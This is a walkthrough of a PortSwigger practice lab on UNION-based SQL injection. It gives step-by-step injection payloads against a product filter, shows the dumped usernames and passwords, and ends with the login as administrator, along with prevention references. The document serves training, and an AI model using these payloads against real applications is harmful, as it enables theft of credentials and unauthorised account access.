# PortSwigger — SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection. The query returns 2 columns but **only one is string-compatible**. The database contains a `users` table with `username` and `password` columns. Since a single text column is available, both values are retrieved by concatenating them using PostgreSQL's `||'~'||` operator.

**Lab URL:** `https://0a38008c04031b8180ab210d00d6004f.web-security-academy.net/`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The database contains a different table called `users`, with columns called `username` and `password`.
>
> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — UNION Attacks**
- Goal: Dump the `users` table and authenticate as `administrator`

---

## Recon

### Step 1 — Identify the injection point

The application exposes a `category` GET parameter:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

Appending `'` triggers a **500 Internal Server Error** — the parameter is injectable.

### Step 2 — Determine column count

Probing with `ORDER BY`:

```
' ORDER BY 1--   → 200 OK
' ORDER BY 2--   → 200 OK
' ORDER BY 3--   → 500 Error
```

Confirmed with a UNION NULL probe:

```
/filter?category=Gifts' UNION SELECT NULL,NULL--
```

**Response: 200 OK** → **2 columns** ✅

### Step 3 — Identify string-compatible columns

Unlike the previous lab, only one column renders text content:

```
' UNION SELECT 'test',NULL--   → 500 Error   (column 1 = integer type)
' UNION SELECT NULL,'test'--   → 200 OK + 'test' displayed ✓
```

**Only column 2 accepts string data** — a concatenation trick is required ✅

---

## Exploitation

### Step 4 — Dump the users table via concatenation

Since only one column accepts text, both `username` and `password` must be injected into it simultaneously. Using PostgreSQL's `||` concatenation operator with a `~` separator to distinguish the values:

```
' UNION SELECT NULL,username||'~'||password FROM users--
```

The injected query becomes:

```sql
SELECT name, description FROM products WHERE category = ''
UNION SELECT NULL, username||'~'||password FROM users--'
```

**Response — all credentials returned in the page:**

```
administrator~gs0awq7mvall12xrnahd
carlos~[redacted]
wiener~[redacted]
```

### Step 5 — Authenticate as administrator

Navigating to `/login`:
- **Username:** `administrator`
- **Password:** `gs0awq7mvall12xrnahd`

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Gifts' → 500 error → injection confirmed
        ↓
' ORDER BY 3-- → 500 error → 2 columns confirmed
        ↓
' UNION SELECT 'test',NULL-- → Error → column 1 is integer
' UNION SELECT NULL,'test'-- → OK    → column 2 is string-compatible ✅
        ↓
' UNION SELECT NULL,username||'~'||password FROM users--
→ full credential dump:
  administrator~gs0awq7mvall12xrnahd
  carlos~[redacted]
  wiener~[redacted]
        ↓
Login as administrator → LAB SOLVED ✅
```

---

## Key Takeaways

- When multiple values are needed but only one string-compatible column is available, use concatenation operators: `||` in PostgreSQL, `CONCAT()` in MySQL, `+` in MSSQL
- A separator character (`~` here) between concatenated values is essential to reliably parse the output
- Column data types matter — an integer column rejects string payloads; `ORDER BY` and `NULL` probing identify this before crafting the final payload
- Passwords stored in **plaintext** — combined with SQLi this results in an instant, complete credential breach

---

## References

- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)

